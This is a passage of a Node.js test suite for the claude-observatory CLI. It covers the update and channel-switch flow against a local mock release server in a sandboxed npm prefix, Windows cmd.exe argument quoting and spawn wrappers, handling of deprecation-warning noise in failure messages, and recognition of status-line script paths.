  assert.equal(core.assetFor(STABLE.assets, 'vscode'), null, 'a missing asset is null, not a guess');
  assert.equal(
    core.assetFor([{ name: 'claude-observatory-jetbrains-v0.9.5.zip' }], 'jetbrains').name,
    'claude-observatory-jetbrains-v0.9.5.zip'
  );
});

test('cli: the update/switch mechanism WORKS end-to-end — mock releases API, real downloads, real installs, both directions (0.9.0)', async () => {
  // The whole flow, minus github.com itself: a LOCAL mock of the releases API (the
  // CLAUDE_OBSERVATORY_RELEASES_API seam) serving one stable and one prerelease whose assets are
  // REAL npm-installable tarballs — and a sandboxed npm global prefix (npm_config_prefix), so the
  // genuine `npm i -g` lands in scratch and the machine's real install is never touched.
  const home = freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const http = require('http');

  const work = fs.realpathSync(tmpWork());
  const pkgDir = path.join(work, 'fakecli');
  fs.mkdirSync(pkgDir, { recursive: true });
  const mkTgz = (version) => {
    fs.writeFileSync(
      path.join(pkgDir, 'package.json'),
      JSON.stringify({ name: 'claude-observatory', version, bin: { 'claude-observatory': 'co.js' } })
    );
    fs.writeFileSync(path.join(pkgDir, 'co.js'), '#!/usr/bin/env node\nconsole.log("fake " + require("./package.json").version);\n');
    cp.execSync('npm pack --silent', { cwd: pkgDir, stdio: ['ignore', 'ignore', 'ignore'] });
    return path.join(pkgDir, `claude-observatory-${version}.tgz`);
  };
  const stableTgz = mkTgz('9.9.9');
  const devTgz = mkTgz('9.10.0-dev.7');

  const srv = http.createServer((req, res) => {
    if (req.url.startsWith('/releases')) {
      const base = `http://127.0.0.1:${srv.address().port}`;
      res.setHeader('content-type', 'application/json');
      // The REAL shapes: the rolling pre-release keeps a FIXED tag and carries its version in the
      // title (exactly what .github/workflows/dev-release.yml publishes); stable versions by tag.
      res.end(JSON.stringify([
        { tag_name: 'dev-latest', name: 'Pre-release 9.10.0-dev.7 (rolling, from dev)', prerelease: true, assets: [{ name: 'claude-observatory-cli-dev.tgz', browser_download_url: `${base}/a/dev.tgz` }] },
        { tag_name: 'v9.9.9', name: 'Claude Observatory v9.9.9', prerelease: false, assets: [{ name: 'claude-observatory-9.9.9.tgz', browser_download_url: `${base}/a/stable.tgz` }] },
      ]));
    } else if (req.url === '/a/dev.tgz') res.end(fs.readFileSync(devTgz));
    else if (req.url === '/a/stable.tgz') res.end(fs.readFileSync(stableTgz));
    else { res.statusCode = 404; res.end(); }
  });
  await new Promise((r) => srv.listen(0, '127.0.0.1', r));

  const prefix = path.join(work, 'npm-prefix');
  fs.mkdirSync(prefix, { recursive: true });
  const env = {
    ...process.env,
    HOME: home,
    USERPROFILE: home,
    CLAUDE_OBSERVATORY_RELEASES_API: `http://127.0.0.1:${srv.address().port}`,
    npm_config_prefix: prefix,
    CLAUDE_OBSERVATORY_NO_UPDATE_CHECK: '1',
  };
  delete env.CLAUDE_CONFIG_DIR;
  // ASYNC exec, deliberately: the mock server lives in THIS process, and a sync exec would block the
  // event loop that has to accept the child's requests — a deadlock that reads as a network timeout.
  const run = (args) =>
    new Promise((resolve, reject) => {
      cp.execFile('node', [CLI, ...args], { env, encoding: 'utf8' }, (err, stdout, stderr) => {
        if (err) reject(new Error(`${args.join(' ')} failed: ${stderr || stdout || err.message}`));
        else resolve(stdout);
      });
    });
  // npm's global module dir differs per OS (lib/node_modules vs node_modules).
  const installedPkgJson = () => {
    for (const p of [
      path.join(prefix, 'lib', 'node_modules', 'claude-observatory', 'package.json'),
      path.join(prefix, 'node_modules', 'claude-observatory', 'package.json'),
    ]) if (fs.existsSync(p)) return JSON.parse(fs.readFileSync(p, 'utf8'));
    return null;
  };

  try {
    // 1. `update --check`: the followed channel is named, and the dev tip is disclosed.
    const chk = await run(['update', '--check']);
    assert.match(chk, /channel: stable/, '--check names the followed channel');
    assert.match(chk, /9\.9\.9/, 'stable resolves against the mock');
    assert.match(chk, /pre-release channel: 9\.10\.0-dev\.7/, 'the dev tip is disclosed to stable users');

    // 2. SWITCH to dev: the channel persists AND the dev tarball really downloads + installs.
    const sw = await run(['update', '--channel', 'dev', '--cli-only']);
    assert.match(sw, /switched to the pre-release \(dev\) channel/, 'the switch is announced');
    assert.equal(core.getUpdateChannel(), 'dev', 'the channel file persisted at the store root');
    assert.equal(installedPkgJson()?.version, '9.10.0-dev.7', 'the dev build LANDED in the sandboxed global prefix');

    // 3. And BACK: stable is a semver DOWNGRADE from the dev build — the one case a plain
    //    isNewer gate would refuse; a switch must install it anyway.
    const back = await run(['update', '--channel', 'stable', '--cli-only']);
    assert.match(back, /switched to the stable channel/, 'the reverse switch is announced');
    assert.equal(installedPkgJson()?.version, '9.9.9', 'the stable build replaced the dev build');
    assert.equal(core.getUpdateChannel(), 'stable', 'the channel followed back');

    // 4. `version --check --json` — the exact payload both editors' dropdowns render.
    const vj = JSON.parse(await run(['version', '--check', '--json']));
    assert.equal(vj.channel, 'stable');
    assert.equal(vj.stableLatest, '9.9.9');
    assert.equal(vj.devLatest, '9.10.0-dev.7');
    assert.equal(vj.updateAvailable, core.compareVersions('9.9.9', vj.current) !== 0, 'updateAvailable is any DIFFERENCE from the channel, not just a higher number');
    assert.equal(vj.stranded, core.compareVersions('9.9.9', vj.current) < 0, 'stranded says which way the difference points');
  } finally {
    srv.close();
  }
});

test('cli: an install ABOVE the channel is pulled back onto it, and --json changes nothing (0.9.5)', async () => {
  // THE REPORTED BUG, end to end. A build whose version outranks everything the channel publishes —
  // a local build, or the state left by a channel switched downward — used to report a green "up to
  // date" on every surface, forever, because the gate was `isNewer`. Following a channel means
  // MATCHING it. The target here is deliberately 0.0.1: lower than any version this repo can ever
  // carry, so the test states "installed sorts ABOVE the channel" without depending on the CI stamp.
  const home = freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const http = require('http');
  const work = fs.realpathSync(tmpWork());
  const pkgDir = path.join(work, 'fakecli');
  fs.mkdirSync(pkgDir, { recursive: true });
  fs.writeFileSync(
    path.join(pkgDir, 'package.json'),
    JSON.stringify({ name: 'claude-observatory', version: '0.0.1', bin: { 'claude-observatory': 'co.js' } })
  );
  fs.writeFileSync(path.join(pkgDir, 'co.js'), '#!/usr/bin/env node\nconsole.log("fake 0.0.1");\n');
  cp.execSync('npm pack --silent', { cwd: pkgDir, stdio: ['ignore', 'ignore', 'ignore'] });
  const tgz = path.join(pkgDir, 'claude-observatory-0.0.1.tgz');

  const srv = http.createServer((req, res) => {
    if (req.url.startsWith('/releases')) {
      const base = `http://127.0.0.1:${srv.address().port}`;
      res.setHeader('content-type', 'application/json');
      res.end(JSON.stringify([
        { tag_name: 'v0.0.1', name: 'Claude Observatory v0.0.1', prerelease: false, assets: [{ name: 'claude-observatory-0.0.1.tgz', browser_download_url: `${base}/a/s.tgz` }] },
      ]));
    } else if (req.url === '/a/s.tgz') res.end(fs.readFileSync(tgz));
    else { res.statusCode = 404; res.end(); }
  });
  await new Promise((r) => srv.listen(0, '127.0.0.1', r));

  const prefix = path.join(work, 'npm-prefix');
  fs.mkdirSync(prefix, { recursive: true });
  const env = {
    ...process.env,
    HOME: home,
    USERPROFILE: home,
    CLAUDE_OBSERVATORY_RELEASES_API: `http://127.0.0.1:${srv.address().port}`,
    npm_config_prefix: prefix,
    CLAUDE_OBSERVATORY_NO_UPDATE_CHECK: '1',
  };
  delete env.CLAUDE_CONFIG_DIR;
  const run = (args) =>
    new Promise((resolve, reject) => {
      cp.execFile('node', [CLI, ...args], { env, encoding: 'utf8' }, (err, stdout, stderr) => {
        if (err) reject(new Error(`${args.join(' ')} failed: ${stderr || stdout || err.message}`));
        else resolve(stdout);
      });
    });
  const installedPkgJson = () => {
    for (const p of [
      path.join(prefix, 'lib', 'node_modules', 'claude-observatory', 'package.json'),
      path.join(prefix, 'node_modules', 'claude-observatory', 'package.json'),
    ]) if (fs.existsSync(p)) return JSON.parse(fs.readFileSync(p, 'utf8'));
    return null;
  };

  try {
    // The plan says `ahead`, in words a human can act on — not "up to date".
    const chk = await run(['update', '--check', '--cli-only']);
    assert.match(chk, /not on this channel — will be replaced/, 'the stranded install is named, not silently passed');
    assert.doesNotMatch(chk, /CLI: up to date/, 'and never reported as current');

    // --json reports the same verdict, structurally, and installs NOTHING.
    const before = installedPkgJson();
    const pj = JSON.parse(await run(['update', '--json', '--cli-only']));
    const cliRow = pj.surfaces.find((s) => s.surface === 'cli');
    assert.equal(cliRow.reason, 'ahead', 'the structured hand-off carries the reason, so no editor has to grep prose');
    assert.equal(cliRow.to, '0.0.1');
    assert.equal(pj.upToDate, false);
    assert.deepEqual(installedPkgJson(), before, '--json is read-only — it reports the plan and changes nothing');

    // And a PLAIN update — no --force, no --channel — actually moves it back onto the channel.
    await run(['update', '--cli-only']);
    assert.equal(installedPkgJson()?.version, '0.0.1', 'the stranded install was pulled back onto the channel');

    // Documented limitation, asserted so it cannot drift: the CLI row reports the version of the
    // process doing the reporting, which is still the old binary until the next invocation. The
    // install landed (asserted above); this run cannot see its own replacement.
    const after = await run(['update', '--json', '--cli-only']);
    assert.equal(JSON.parse(after).surfaces.find((s) => s.surface === 'cli').reason, 'ahead',
      'the CLI row reflects the RUNNING build, not the one just written to the prefix');
  } finally {
    srv.close();
  }
});

// --- the one launcher for every child process (win32 shell rules + DEP0190) --------------------

test('spawn: launchSpec builds a cmd.exe-safe command string on win32, and leaves posix untouched', () => {
  // The win32 shape is asserted from macOS/Linux because launchSpec takes `platform` — that is the
  // whole reason it does. Without it none of this would be testable off a Windows runner.
  const win = (f, a) => core.launchSpec(f, a, { platform: 'win32' });

  assert.deepEqual(
    win('C:\\Program Files\\Microsoft VS Code\\bin\\code.cmd', [
      '--install-extension',
      'C:\\Users\\First Last\\AppData\\Local\\Temp\\co.vsix',
      '--force',
    ]),
    {
      file:
        '"C:\\Program Files\\Microsoft VS Code\\bin\\code.cmd" --install-extension ' +
        '"C:\\Users\\First Last\\AppData\\Local\\Temp\\co.vsix" --force',
      args: [],
      shell: true,
    },
    'a .cmd shim and a spaced temp path both get quoted into ONE command string'
  );
  assert.deepEqual(
    win('npm.cmd', ['i', '-g', 'C:\\Temp\\co.tgz']),
    { file: 'npm.cmd i -g C:\\Temp\\co.tgz', args: [], shell: true },
    'clean tokens stay bare so the command still reads like a command'
  );

  // Every character cmd.exe reads as syntax must force quoting. These are all LEGAL in a Windows
  // path (`C:\Users\me\R&D\repo`), so an unquoted one is both a broken command and an injection.
  for (const ch of [' ', '&', '|', '<', '>', '^', '(', ')', '%', '!', ',', ';', '=', '"']) {
    const q = core.quoteForCmd(`a${ch}b`);
    assert.ok(q.startsWith('"') && q.endsWith('"'), `${JSON.stringify(ch)} must force quoting (got ${q})`);
  }
  assert.equal(core.quoteForCmd('--force'), '--force', 'a clean token is left bare');
  assert.equal(core.quoteForCmd(''), '""', 'an empty argument must survive as an empty argument');
  assert.equal(core.quoteForCmd('a"b'), '"ab"', 'an embedded quote is dropped — cmd cannot express one');
  assert.equal(core.quoteForCmd('C:\\a b\\repo\\'), '"C:\\a b\\repo\\\\"', 'a trailing \\ is doubled');
  assert.equal(core.quoteForCmd('C:\\a b\\repo\\\\'), '"C:\\a b\\repo\\\\\\\\"', 'a RUN of them, too');
  assert.equal(core.quoteForCmd('\\\\server\\share\\x y'), '"\\\\server\\share\\x y"', 'a UNC path is untouched');

  // The trailing-backslash rule was first written as `/(\\+)$/`, which backtracks quadratically on a
  // long run of backslashes that ISN'T at the end — 508 ms at 32k inputs, and this function's input
  // includes environment-derived paths. The bound is ~4 orders of magnitude above the real cost
  // (~0.006 ms), so it flags the regression without flaking on a slow runner.
  const pathological = '\\'.repeat(32000) + ' x';
  const began = process.hrtime.bigint();
  const quoted = core.quoteForCmd(pathological);
  const ms = Number(process.hrtime.bigint() - began) / 1e6;
  assert.ok(quoted.endsWith(' x"'), 'still correct on the pathological input');
  assert.ok(ms < 100, `quoteForCmd must stay linear (took ${ms.toFixed(1)} ms — js/polynomial-redos)`);

  // POSIX must be byte-for-byte what it was before this module existed.
  assert.deepEqual(core.launchSpec('npm', ['i', '-g', '/tmp/co.tgz'], { platform: 'darwin' }), {
    file: 'npm',
    args: ['i', '-g', '/tmp/co.tgz'],
    shell: false,
  });
  assert.deepEqual(core.launchSpec('sh', ['-c', 'command -v "$1"', 'sh', 'jq'], { platform: 'linux' }), {
    file: 'sh',
    args: ['-c', 'command -v "$1"', 'sh', 'jq'],
    shell: false,
  });

  // A real executable image never needs the shell — the daily update check spawns process.execPath
  // DETACHED, and cmd.exe there would flash a console window on the desktop once a day.
  assert.equal(core.needsWinShell('C:\\Program Files\\nodejs\\node.exe'), false);
  assert.equal(core.needsWinShell('C:\\x\\NODE.EXE'), false, 'the extension test is case-insensitive');
  assert.equal(core.needsWinShell('C:\\x\\thing.com'), false, '.com counts too');
  assert.equal(core.needsWinShell('C:\\x\\node.exe.cmd'), true, 'anchored at the END — this one IS a .cmd');
  assert.equal(core.needsWinShell('code'), true, 'a bare name may be a .cmd shim, which libuv will never find');
  assert.equal(win('powershell', ['-Command', 'x']).shell, true, 'bare names default to the shell');
  assert.equal(
    core.launchSpec('powershell', ['-Command', 'x'], { platform: 'win32', direct: true }).shell,
    false,
    '`direct` opts a caller out when its args cannot survive cmd quoting'
  );

  // THE invariant. DEP0190 fires on a POPULATED args array alongside shell:true, and shell mode
  // concatenates such an array unquoted. Both failure modes are excluded by this one assertion, so
  // it has to hold for every input — this is what the pre-fix code violated at all seven sites.
  for (const [file, args] of [
    ['npm.cmd', ['i', '-g', 'C:\\a b\\x.tgz']],
    ['claude-observatory.cmd', ['changemap', '--json', '--root', 'C:\\Users\\First Last\\repo']],
    ['code', []],
    ['x.exe', ['a b']],
  ]) {
    const s = win(file, args);
    if (s.shell) assert.equal(s.args.length, 0, `shell:true must carry an EMPTY args array (${file})`);
  }
});

test('spawn: our launch shape does not trigger the DEP0190 deprecation', (t) => {
  // Read the warning off a CHILD's stderr: Node latches each deprecation per process, so asking the
  // test runner itself would answer only once and then lie forever after.
  const warnedBy = (file, args) =>
    cp.spawnSync(
      process.execPath,
      [
        '-e',
        `require('child_process').spawnSync(${JSON.stringify(file)}, ${JSON.stringify(args)}, ` +
          `{ shell: true, stdio: 'ignore' })`,
      ],
      { encoding: 'utf8' }
    ).stderr || '';

  // ASK THE RUNTIME, never a version number. DEP0190 has moved between documentation-only, runtime,
  // and "application code only" across releases, and a hardcoded `>= 22.15` gate asserted the control
  // on node 22.23.1, which does NOT emit it — turning three green lanes red for the wrong reason.
  const control = warnedBy('echo', ['hi']); // the shape being replaced
  const s = core.launchSpec('echo', ['hi'], { platform: 'win32' }); // force the win32 shape anywhere

  assert.doesNotMatch(warnedBy(s.file, s.args), /DEP0190|DeprecationWarning/, 'ours never warns');

  if (/DEP0190/.test(control)) {
    // The instrument demonstrably fires here, so the assertion above carries real weight.
    t.diagnostic(`node ${process.versions.node} emits DEP0190 — the deprecated shape was proven to warn`);
  } else {
    // Honest about it: on this runtime the assertion above cannot fail, whatever the implementation.
    // The shell:true-implies-empty-args invariant in the unit test is what guards the shape here.
    t.diagnostic(`node ${process.versions.node} does not emit DEP0190 at runtime — assertion is vacuous on this lane`);
  }
});

test('spawn: a launched command delivers the argv a bare spawn would, spaces and all', () => {
  // The probe lives at a space-free path and only the --root VALUE carries a space: that is the real
  // shape (`spawnCliJson(bin, [.., '--root', cwd])` with a workspace under C:\Users\First Last).
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'cc-spawn-'));
  const probe = path.join(dir, 'argv.js');
  fs.writeFileSync(probe, 'console.log(JSON.stringify(process.argv.slice(2)))');
  const args = ['changemap', '--json', '--root', path.join(dir, 'First Last', 'repo')];

  // Whatever shape this platform's launchSpec chose, RUNNING it must reproduce the bare-spawn argv.
  // (On Windows process.execPath ends in .exe so this takes the direct branch; off Windows it takes
  // the shell branch. Asserting which one would just re-assert the unit test above — and asserting
  // `shell === true` here is exactly the mistake that would turn the Windows lane red.)
  const out = core.spawnToolSync(process.execPath, [probe, ...args], { encoding: 'utf8' });
  assert.deepEqual(JSON.parse(out.stdout.trim()), args, 'the spaced --root value arrived as ONE argument');

  // POSITIVE CONTROL — the shape this replaces DOES corrupt it. If this stops splitting, the
  // assertion above has stopped proving anything. Run it in a GRANDCHILD: the deprecated form emits
  // DEP0190, and a stray one on the runner's stderr would read in CI as the very bug being fixed.
  const naive = cp
    .spawnSync(
      process.execPath,
      [
        '-e',
        `const r = require('child_process').spawnSync(${JSON.stringify(process.execPath)}, ` +
          `${JSON.stringify([probe, ...args])}, { shell: true, encoding: 'utf8' }); ` +
          `process.stdout.write(r.stdout || '')`,
      ],
      { encoding: 'utf8' }
    )
    .stdout.trim();
  const split = JSON.parse(naive);
  assert.equal(split.length, args.length + 1, 'the one spaced --root value arrived as TWO arguments');
  assert.ok(
    split.some((a) => a.endsWith(`${path.sep}First`)) && split.includes(`Last${path.sep}repo`),
    'and it broke exactly at the space'
  );
});

test('spawn: the wrappers apply the spec and forward cwd/env/stdio', () => {
  const dir = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'cc-wrap-')));
  const probe = path.join(dir, 'probe.js');
  fs.writeFileSync(
    probe,
    'console.log(JSON.stringify({ argv: process.argv.slice(2), cwd: process.cwd(), tag: process.env.CO_TAG }))'
  );
  const args = [probe, 'a b', 'R&D'];
  const opts = { cwd: dir, env: { ...process.env, CO_TAG: 'forwarded' }, encoding: 'utf8' };

  const sync = JSON.parse(core.spawnToolSync(process.execPath, args, opts).stdout.trim());
  assert.deepEqual(sync.argv, ['a b', 'R&D'], 'spawnToolSync: argv survives spaces and cmd syntax');
  assert.equal(fs.realpathSync(sync.cwd), dir, 'spawnToolSync: cwd is forwarded, not eaten by split()');
  assert.equal(sync.tag, 'forwarded', 'spawnToolSync: env is forwarded');

  // The wrappers must go THROUGH launchSpec, not around it. The discriminator is ENOENT fidelity:
  // a shell reports a missing binary as exit 127, a direct spawn as error ENOENT / status null.
  // A wrapper that ignored the spec would answer the direct way for both of these.
  const missing = 'claude-observatory-definitely-not-a-real-binary';
  const viaShell = core.spawnToolSync(missing, [], { platform: 'win32', stdio: 'ignore' });
  assert.equal(viaShell.error, undefined, 'forced win32: went through a shell, so no spawn error');
  assert.notEqual(viaShell.status, null, 'forced win32: the shell itself ran and reported a status');
  const viaDirect = core.spawnToolSync(missing, [], { platform: 'win32', direct: true, stdio: 'ignore' });
  assert.equal(viaDirect.error && viaDirect.error.code, 'ENOENT', '`direct` keeps the real spawn error');

  // The same discriminator for the other two wrappers — each has its own code path to the spec.
  const asyncErrCode = (o) =>
    new Promise((resolve) => {
      const c = core.spawnTool(missing, [], { ...o, stdio: 'ignore' });
      c.on('error', (e) => resolve(e.code));
      c.on('close', (code) => resolve(`exit:${code}`));
    });
  const execErrCode = (o) =>
    new Promise((resolve) => core.execFileTool(missing, [], o, (err) => resolve(err && err.code)));

  return Promise.all([
    asyncErrCode({ platform: 'win32' }).then((c) =>
      assert.notEqual(c, 'ENOENT', 'spawnTool: forced win32 went through a shell')
    ),
    asyncErrCode({ platform: 'win32', direct: true }).then((c) =>
      assert.equal(c, 'ENOENT', 'spawnTool: `direct` keeps the real spawn error')
    ),
    execErrCode({ platform: 'win32' }).then((c) =>
      assert.notEqual(c, 'ENOENT', 'execFileTool: forced win32 went through a shell')
    ),
    execErrCode({ platform: 'win32', direct: true }).then((c) =>
      assert.equal(c, 'ENOENT', 'execFileTool: `direct` keeps the real spawn error')
    ),
    new Promise((resolve, reject) => {
      core.execFileTool(process.execPath, args, opts, (err, stdout) => {
        try {
          assert.equal(err, null);
          const r = JSON.parse(String(stdout).trim());
          assert.deepEqual(r.argv, ['a b', 'R&D'], 'execFileTool: argv survives');
          assert.equal(r.tag, 'forwarded', 'execFileTool: env is forwarded');
          resolve();
        } catch (e) {
          reject(e);
        }
      });
    }),
    new Promise((resolve, reject) => {
      const child = core.spawnTool(process.execPath, args, { ...opts, stdio: ['ignore', 'pipe', 'ignore'] });
      let out = '';
      child.stdout.on('data', (d) => (out += d));
      child.on('close', () => {
        try {
          const r = JSON.parse(out.trim());
          assert.deepEqual(r.argv, ['a b', 'R&D'], 'spawnTool: argv survives');
          assert.equal(fs.realpathSync(r.cwd), dir, 'spawnTool: cwd is forwarded');
          resolve();
        } catch (e) {
          reject(e);
        }
      });
    }),
  ]);
});

test('spawn(win32): a real .cmd shim round-trips through real cmd.exe', { skip: process.platform !== 'win32' }, () => {
  // Everything above proves the SHAPE. Only the Windows runner can prove the shape is right, because
  // only there does shell:true mean cmd.exe — elsewhere Node runs /bin/sh, whose quoting rules are
  // not the ones this module encodes. This is also the case the whole module exists for: a .cmd
  // shim, which libuv cannot launch and cannot even find.
  const dir = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'cc-cmd-')));
  const probe = path.join(dir, 'probe.js');
  fs.writeFileSync(probe, 'console.log(JSON.stringify(process.argv.slice(2)))');
  const shim = path.join(dir, 'shim.cmd');
  fs.writeFileSync(shim, `@echo off\r\n"${process.execPath}" "${probe}" %*\r\n`);

  const spaced = path.join(dir, 'First Last', 'repo');
  const args = ['changemap', '--json', '--root', spaced, '--session', 'a&b'];
  const r = core.spawnToolSync(shim, args, { encoding: 'utf8' });
  assert.equal(r.error, undefined, 'a .cmd is launchable through the launcher (it is not, without one)');
  assert.equal(r.status, 0, `shim exited non-zero: ${r.stderr}`);
  assert.deepEqual(JSON.parse(r.stdout.trim()), args, 'cmd.exe round-trips spaces AND & exactly');
});

test('spawn: no source file spawns a child process except through the launcher', () => {
  // The Windows rules above are not knowledge a future edit will have. This is the tripwire: every
  // spawn in the project must go through core/spawn, so there is exactly ONE place that can be wrong.
  // It keys on the child_process IMPORT rather than on call names, because `.exec(` is also RegExp's.
  //
  // WALK the source dirs — do not list files. A hardcoded list misses the most likely future edit of
  // all, which is a NEW file; and the specifier must tolerate the `node:` prefix (already house style
  // in scripts/) and the dynamic form, or the guard is a stile with no fence beside it.
  const roots = [
    ['packages/core/src', path.resolve(__dirname, '../src')],
    ['packages/cli/src', path.resolve(__dirname, '../../cli/src')],
    ['packages/vscode/src', path.resolve(__dirname, '../../vscode/src')],
  ];
  const files = [];
  const walk = (rel, abs) => {
    for (const e of fs.readdirSync(abs, { withFileTypes: true })) {
      if (e.isDirectory()) walk(`${rel}/${e.name}`, path.join(abs, e.name));
      else if (/\.(ts|mts|cts|js|mjs|cjs)$/.test(e.name)) files.push([`${rel}/${e.name}`, path.join(abs, e.name)]);
    }
  };
  for (const [rel, abs] of roots) walk(rel, abs);
  const scanned = files.filter(([rel]) => rel !== 'packages/core/src/spawn.ts');
  assert.ok(scanned.length > 20, `sanity: expected to walk the source tree, found ${scanned.length} files`);
  assert.ok(
    scanned.some(([rel]) => rel === 'packages/vscode/src/extension.ts') &&
      scanned.some(([rel]) => rel === 'packages/cli/src/index.ts'),
    'sanity: the walk must reach the two biggest offenders-by-history'
  );

  // `require('child_process')`, `from 'child_process'`, `import('child_process')` — with or without
  // the `node:` prefix. `import type * as cp` is exempt: extension.ts needs cp.ChildProcess for a
  // variable's type, and a type import cannot spawn anything.
  const REACHES_CHILD_PROCESS = /(?:require|import)\s*\(\s*['"](?:node:)?child_process['"]\s*\)|\bfrom\s+['"](?:node:)?child_process['"]/;
  const offenders = [];
  for (const [rel, abs] of scanned) {
    fs.readFileSync(abs, 'utf8')
      .split('\n')
      .forEach((line, i) => {
        if (/^\s*import\s+type\b/.test(line)) return;
        if (REACHES_CHILD_PROCESS.test(line)) offenders.push(`${rel}:${i + 1}  ${line.trim()}`);
      });
  }
  assert.deepEqual(
    offenders,
    [],
    'these reach child_process directly instead of core/spawn — see packages/core/src/spawn.ts:\n  ' + offenders.join('\n  ')
  );
});

test('failure: a deprecation warning never outranks the real reason (#45)', () => {
  // The exact pair of streams the reporter's machine produced: stdout carried the reason, stderr held
  // only Node's warning, and the editors rendered `stderr || stdout`.
  const dep =
    '(node:326100) [DEP0190] DeprecationWarning: Passing args to a child process with shell option ' +
    'true can lead to security vulnerabilities, as the arguments are not escaped, only concatenated.\n' +
    '(Use `node --trace-deprecation ...` to show where the warning was created)\n';
  const progress =
    'channel: pre-release (dev)\ndownloading claude-observatory-cli-dev.tgz …\ninstalling globally (npm i -g) …\n' +
    '✓ updated the CLI 0.9.0 → 0.9.1\n' +
    "  ⚠ VS Code --install-extension failed — install the .vsix manually from the release\n";
  const msg = core.cliFailureMessage(progress, dep, 'is the claude-observatory CLI installed?');
  assert.match(msg, /--install-extension failed/, 'the reason wins');
  assert.doesNotMatch(msg, /DEP0190|DeprecationWarning/, 'the warning is gone');
  // POSITIVE CONTROL for the old rule: it would have returned the warning verbatim.
  assert.match(String(dep || progress).trim().slice(0, 300), /DEP0190/, 'the pre-fix ordering did show the warning');

  // A genuine stderr failure still wins — this is why "always prefer stdout" would be wrong. fail()
  // writes here, and when it has, that IS the reason.
  assert.match(
    core.cliFailureMessage('downloading …\ninstalling globally …', 'claude-observatory: npm install failed (exit 1)', 'x'),
    /npm install failed \(exit 1\)/
  );
  // Warning noise plus a real stderr line: keep the line, drop the noise.
  assert.equal(core.cliFailureMessage('', dep + 'claude-observatory: release has no .vsix asset\n', 'x'),
    'claude-observatory: release has no .vsix asset');
  // Nothing classifiable → the TAIL of stdout, where a summary lives (not the head, which is progress).
  assert.match(core.cliFailureMessage('step one\nstep two\nsummary line', '', 'x'), /summary line/);
  // Nothing at all → the caller's fallback, never an empty toast.
  assert.equal(core.cliFailureMessage('', dep, 'is the claude-observatory CLI installed?'),
    'is the claude-observatory CLI installed?');
  assert.equal(core.cliFailureMessage(null, undefined, 'fallback'), 'fallback', 'null/undefined are tolerated');
  // The cap keeps a toast a toast.
  assert.equal(core.cliFailureMessage('', 'x'.repeat(500), 'f').length, 300);
});

test('failure: the JetBrains plugin mirrors cliFailureMessage (cross-editor parity)', () => {
  // Kotlin cannot import the TS. This pins the mirror: the rule must not silently exist in one editor
  // and not the other, which is the shape of the bug it fixes.
  const kt = fs.readFileSync(
    path.resolve(__dirname, '../../jetbrains/src/main/kotlin/com/cellobservatory/observatory/core/ObservatoryCli.kt'),
    'utf8'
  );
  assert.match(kt, /fun failureMessage\(/, 'ObservatoryCli.failureMessage must exist');
  assert.match(kt, /NODE_NOISE/, 'and strip Node warning noise like the TS does');
  assert.match(kt, /LOOKS_LIKE_TROUBLE/, 'and prefer the trouble lines of stdout');
  assert.doesNotMatch(
    kt,
    /r\.stderr\.ifBlank \{ r\.stdout \}/,
    'the old stderr-first rule must be gone, not merely shadowed'
  );
});

test('statusline(win32): OUR script is recognised through Git Bash / WSL / Cygwin paths', () => {
  // The installer is bash, so on Windows it writes an MSYS-shaped path; path.join() here writes a
  // native one. A raw substring test between those is false forever, which is why `update` silently
  // never refreshed the status line on Windows and `uninstall --all` orphaned it.
  const dir = 'C:\\Users\\First Last\\.claude';
  const ours = (cmd) => core.referencesOurStatusline(cmd, dir, 'win32');

  assert.ok(ours('bash /c/Users/First Last/.claude/statusline.sh'), 'Git Bash / MSYS drive prefix');
  assert.ok(ours('bash "/c/Users/First Last/.claude/statusline.sh"'), 'MSYS, quoted — what we now write');
  assert.ok(ours('bash /mnt/c/Users/First Last/.claude/statusline.sh'), 'WSL');
  assert.ok(ours('bash /cygdrive/c/Users/First Last/.claude/statusline.sh'), 'Cygwin');
  assert.ok(ours('bash "/C/Users/First Last/.claude/statusline.sh"'), 'an UPPER-case MSYS drive folds too');
  assert.ok(ours('bash /MNT/C/Users/First Last/.claude/statusline.sh'), 'and an upper-case WSL one');
  assert.ok(ours('bash "C:\\Users\\First Last\\.claude\\statusline.sh"'), 'native, quoted');
  assert.ok(ours('bash C:/Users/First Last/.claude/statusline.sh'), 'native with forward slashes');
  assert.ok(ours('bash c:\\users\\first last\\.claude\\statusline.sh'), 'NTFS is case-insensitive');

  // POSITIVE CONTROL for the trap: normalizing SEPARATORS alone passes the native cases above and
  // fails every MSYS one — the exact half-fix that would look right and leave Windows broken.
  const separatorsOnly = (cmd) =>
    cmd.replace(/\\/g, '/').toLowerCase().includes(path.join(dir, 'statusline.sh').replace(/\\/g, '/').toLowerCase());
  assert.ok(!separatorsOnly('bash /c/Users/First Last/.claude/statusline.sh'), 'the half-fix misses MSYS');
  assert.ok(ours('bash /c/Users/First Last/.claude/statusline.sh'), 'the real fix does not');

  // A FOREIGN status line must still be refused, or `update` would overwrite someone else's.
  assert.ok(!ours('bash /c/Users/First Last/tools/statusline.sh'), 'same filename, foreign directory');
  assert.ok(!ours('/usr/local/bin/starship init'), 'an unrelated status line');
  assert.ok(!ours(''), 'empty');
  // POSIX must stay case-SENSITIVE — folding case there would claim a user's own script as ours.
  assert.ok(core.referencesOurStatusline('bash /home/u/.claude/statusline.sh', '/home/u/.claude', 'linux'));
  assert.ok(!core.referencesOurStatusline('bash /home/u/.claude/StatusLine.sh', '/home/u/.claude', 'linux'));
});

test('statusline: uninstall never orphans a statusLine that still points at the script', () => {
  // The settings edit was gated on the match but the unlink was NOT, so on Windows (where the match
  // always failed) `uninstall --all` deleted the script and left settings.json pointing at it —
  // Claude Code then errored on every render, once a minute, with nothing naming us.
  const home = freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const dir = path.join(home, '.claude');
  fs.mkdirSync(dir, { recursive: true });
  const script = path.join(dir, 'statusline.sh');
  const sp = path.join(dir, 'settings.json');

  // A foreign statusLine that merely SHARES the basename: leave their setting alone, but our script is
  // still ours to remove. An earlier draft of this gate tested the bare basename and so kept our script
  // alive forever here — a leak, and a silent one.
  fs.writeFileSync(script, '#!/bin/bash\necho x\n');
  fs.writeFileSync(sp, JSON.stringify({ statusLine: { type: 'command', command: 'bash /opt/theirs/statusline.sh' } }));
  let r = core.uninstallStatusline(sp);
